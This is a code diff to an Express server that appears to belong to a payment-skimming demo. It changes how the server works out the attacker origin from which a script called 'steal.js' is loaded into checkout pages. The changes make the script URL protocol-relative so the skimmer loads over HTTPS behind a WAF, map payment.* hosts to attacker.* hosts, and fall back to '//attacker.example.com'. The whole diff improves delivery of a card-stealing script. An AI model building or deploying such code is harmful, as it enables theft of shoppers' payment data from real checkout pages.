@@ -8,63 +8,60 @@ if (process.env.TRUST_PROXY !== '0') {
   app.set('trust proxy', 1);
 }
 
-/**
- * Respect WAF TLS termination (client uses https; Node sees http).
- */
-function forwardedProto(req) {
-  const raw = req.get('x-forwarded-proto');
-  if (raw) return raw.split(',')[0].trim().toLowerCase();
-  return req.secure ? 'https' : (req.protocol || 'http').split(',')[0].trim().toLowerCase();
-}
-
 function forwardedHost(req) {
   const raw = req.get('x-forwarded-host') || req.get('host');
   if (!raw) return '';
   return raw.split(',')[0].trim();
 }
 
+/** Script URLs use //host — same scheme as the checkout page avoids mixed-content when TLS is fronted but Proxy-Proto is missing. */
+function absoluteToProtocolRelative(embed) {
+  const t = embed.replace(/\/$/, '');
+  try {
+    if (/^https?:\/\//i.test(t)) {
+      const u = new URL(t);
+      return `//${u.host}`;
+    }
+  } catch (_) {}
+  return t;
+}
+
 /**
- * Prefer checkout request Host + X-Forwarded-Proto over ATTACKER_URL so script src matches
- * the site the user actually hit. ATTACKER_URL is fallback when Host cannot be inferred.
- * FORCE_ATTACKER_URL_FROM_ENV=1 forces ATTACKER_URL when set.
- *
- * ATTACKER_DOMAIN sets attacker hostname explicitly; else USE_SAME_ORIGIN_ATTACKER=1 uses
- * payment host; else payment.* -> attacker.*; else same host as checkout.
+ * Prefer checkout Host over ATTACKER_URL; ATTACKER_URL when Host missing (unless FORCE…).
+ * Return protocol-relative "//hostname[:port]" for <script src> so HTTPS pages load steal.js over HTTPS even if Node saw http behind the WAF.
  */
 function resolveAttackerOrigin(req) {
   const legacy = (process.env.ATTACKER_URL || '').trim();
   const forceEnv = (process.env.FORCE_ATTACKER_URL_FROM_ENV || '') === '1';
   if (forceEnv && legacy) {
-    return legacy.replace(/\/$/, '');
+    return absoluteToProtocolRelative(legacy);
   }
 
-  const proto = forwardedProto(req);
   const payHost = forwardedHost(req);
   const explicitAttack = (process.env.ATTACKER_DOMAIN || '').trim();
 
-  let host;
-  if (explicitAttack) host = explicitAttack;
-  else if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') host = payHost;
-  else if (payHost.startsWith('payment.')) host = `attacker.${payHost.slice('payment.'.length)}`;
-  else host = payHost;
+  let hostPart;
+  if (explicitAttack) hostPart = explicitAttack;
+  else if ((process.env.USE_SAME_ORIGIN_ATTACKER || '') === '1') hostPart = payHost;
+  else if (payHost.startsWith('payment.')) hostPart = `attacker.${payHost.slice('payment.'.length)}`;
+  else hostPart = payHost;
 
-  if (host) {
-    let origin = `${proto}://${host}`;
+  if (hostPart) {
     const pubPort = (
       process.env.ATTACKER_PUBLIC_PORT ||
       process.env.EXTERNAL_ATTACKER_PORT ||
       ''
     ).trim();
     if (pubPort && pubPort !== '80' && pubPort !== '443') {
-      origin += `:${pubPort}`;
+      hostPart += `:${pubPort}`;
     }
-    return origin;
+    return `//${hostPart}`;
   }
 
   if (legacy) {
-    return legacy.replace(/\/$/, '');
+    return absoluteToProtocolRelative(legacy);
   }
-  return 'http://attacker.example.com';
+  return '//attacker.example.com';
 }
 
 app.use(express.static(path.join(__dirname, 'public')));
